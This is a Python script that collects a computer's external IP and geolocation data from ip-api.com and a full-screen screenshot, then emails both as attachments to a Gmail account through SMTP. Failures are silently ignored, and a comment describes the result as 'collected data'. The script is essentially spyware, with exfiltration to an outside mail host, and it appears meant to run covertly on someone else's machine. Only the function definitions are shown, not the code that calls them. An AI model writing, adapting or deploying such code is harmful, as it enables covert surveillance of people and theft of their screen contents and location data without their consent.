#!/usr/bin/python3
# -*- coding: utf-8 -*-

#standard library imports
from time import sleep
import smtplib
import datetime
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

#third party imports
import requests
from PIL import ImageGrab


def get_ip():
    #function to get external Ip using Web Page ip-api.com
    url = 'http://www.ip-api.com/json'
    ip = 'data.txt'
    try:
        r = requests.get(url)
        if r.status_code == 200:
            data = r.json()
            with open(ip, 'w') as f:
                f.write(str(data))
            f.close()
            return ip

    except:
        sleep(10)
        get_ip()

def screenshot():
    #function to get screenshot
    dir2 = 'img.jpg'
    ImageGrab.grab().save(dir2, "JPEG")
    return dir2


def send_mail(mail, key, id, ip, dir2):
    #function to send collected data from our mail to himself
    timeInSecs = datetime.datetime.now()
    Server = "smtp.gmail.com"
    port = 465
    to = [mail]
    subject = id + '' + timeInSecs.isoformat()
    attachments = [ip, dir2]
    msg = MIMEMultipart()
    msg['From'] = mail
    msg['To'] = ', '.join( mail )
    msg['Subject'] = subject
    for file in attachments:
        try:
            with open(file, 'rb') as f:
                att = MIMEBase('application', "octet-stream")
                att.set_payload(f.read())
            encoders.encode_base64(att)
            att.add_header('Content-Disposition', 'attachment', filename=file)
            msg.attach(att)
        except:
            pass

    try:
        server = smtplib.SMTP_SSL(host='smtp.gmail.com')
        server.connect(Server, port)
        server.login(mail, key)
        server.sendmail(mail, to, msg.as_string())
        server.quit()
    except:
        pass

